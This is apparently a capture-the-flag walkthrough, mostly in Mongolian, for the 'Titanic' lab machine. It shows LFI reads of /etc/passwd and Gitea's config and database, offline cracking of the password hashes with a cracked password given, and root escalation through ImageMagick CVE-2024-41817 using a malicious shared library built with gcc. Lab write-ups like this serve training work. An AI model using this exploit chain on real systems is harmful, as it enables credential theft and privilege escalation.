# Titanic - Gitea / Magick CVE-2024-41817

1. dev.titanic.htb-ийг олоод хандах үед Gitea гарч ирнэ. Үүний дагуу Explore дээр дараад source кодуудыг харж болдог.
2. Source code дээр `/download?ticket=/etc/passwd` гэх мэт LFI хийх боломжтой мэдэх бөгөөд Gitea-ийн config файлыг дараах замаар уншиж Gitea.db хаана байгааг мэдэж болдог.

```
/home/developer/gitea/data/gitea/conf/app.ini
```

**Gitea.db**

```
/home/developer/gitea/data/gitea/gitea.db
```

**ТУХАЙН DB ФАЙЛД БАЙГАА НУУЦ ҮГИЙГ CRACK ХИЙХДЭЭ ДАРААХ АРГУУДААР ХИЙЖ БОЛНО**

Hashcat pbkdf2 crack with salt аргачлалаар.

Дээрх аргын дагуу хийж нууц үгээ оллоо.

PASSWORD is: 25282528

## Shell as Developer

[image]

## Shell as Root!! - CVE-2024-41817

Хамгийн түрүүнд харсан зүйл бол /opt/script дотор байгаа **identify_images.sh** нь минут бүр ажилладаг.

```bash
# images дотор байгаа бүх зургуудыг олоод magick командаар ажиллуулаад metadata руу log хийдэг.
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

[image]

```bash
/usr/bin/magick --version
# Vulnerable version: ImageMagick 7.1.1-35
```

PoC: https://mindpatch.medium.com/cve-2024-41817-how-env-var-triggers-rce-in-imagemagicks-appimage-14d54aba5613

## Creating a Malicious Shared Library

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF
```

## Executing ImageMagick

```bash
magick hey.png /dev/null
```

[image]
